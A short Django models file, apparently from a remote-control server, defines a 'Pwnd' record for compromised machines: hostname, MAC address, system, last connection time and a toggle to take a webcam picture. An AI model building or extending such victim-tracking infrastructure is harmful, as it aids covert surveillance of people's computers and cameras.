from django.db import models
import datetime

# Create your models here.

class Pwnd(models.Model):
    id = models.CharField(max_length=200, unique=True, primary_key=True)
    hostname = models.CharField(max_length=50)
    mac_address = models.CharField(max_length=50)
    system = models.CharField(max_length=50)
    latest_connection = models.DateTimeField(default=datetime.datetime.now())

    class take_webcam_pic(models.TextChoices):
        TRUE = "true"
        FALSE = "false"

    webcam = models.CharField(max_length=5, default=take_webcam_pic.FALSE, choices=take_webcam_pic.choices)